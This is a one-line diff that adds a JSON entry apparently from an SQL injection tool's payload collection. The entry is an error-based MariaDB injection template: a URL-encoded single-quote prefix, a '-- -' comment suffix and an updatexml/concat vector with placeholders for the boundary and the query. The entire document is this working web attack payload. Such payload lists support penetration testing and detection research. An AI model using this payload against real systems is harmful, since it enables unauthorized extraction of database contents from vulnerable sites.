@@ -1,0 +1,1 @@
+{"dbms": "mariadb", "technique": "error", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND updatexml(1,concat(0x7e,({Q})),1)", "comment": "mariadb error: url-enc single"}
